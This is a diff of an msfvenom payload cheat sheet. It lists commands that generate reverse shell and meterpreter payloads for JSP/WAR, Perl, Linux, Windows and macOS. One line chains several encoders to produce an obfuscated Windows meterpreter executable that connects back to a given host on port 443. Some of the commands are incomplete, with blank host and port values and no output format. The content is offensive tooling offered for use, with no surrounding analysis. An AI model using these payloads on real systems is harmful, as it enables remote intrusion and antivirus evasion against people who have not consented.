@@ -37,6 +37,8 @@ WAR
 
 msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
 
+
+
 Scripting Payloads Python
 =========================
 
@@ -52,6 +54,30 @@ Perl
 
 msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
 
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+
+Linux Based Shellcode
+======================
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f
+
+Windows Based Shellcode
+========================
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f
+
+Mac Based Shellcode
+====================
+
+msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f
+
+
+----------------------------------------------------------------------------------
+----------------------------------------------------------------------------------
+
+MSFVENUM TUTORIALS
+==================
 
 “msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.126.141 LPORT=443 -f raw -e x86/shikata_ga_nai -i 10 | msfvenom -a x86 --platform windows -e x86/countdown -i 5 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 20 -f exe -o /root/Desktop/eyup2.exe”
 
